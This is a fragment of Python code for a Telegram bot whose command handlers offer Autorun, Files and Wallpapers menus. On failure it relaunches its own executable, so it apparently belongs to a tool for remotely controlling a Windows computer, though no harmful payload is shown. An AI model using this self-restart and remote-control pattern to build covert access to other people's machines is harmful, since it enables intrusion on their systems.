	bot.send_message(command.chat.id, '_Select an action_', reply_markup=main2, parse_mode='Markdown')

@bot.message_handler(commands=['Autorun', 'autorun'])
def Autorun(command):
	bot.send_message(command.chat.id, '_Select an action_', reply_markup=main3, parse_mode='Markdown')

@bot.message_handler(commands=['Files', 'files'])
def Files(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode='Markdown')

@bot.message_handler(commands=['Cancel'])
def CancelFiles(command):
	bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode='Markdown')

@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
def Wallpapers(command):
	bot.send_message(command.chat.id, '_Send photo which you would like to set on the Wallpapers_', parse_mode='Markdown')


try:
	bot.polling(none_stop=True)
except:
	os.startfile(CurrentPath)
	sys.exit()
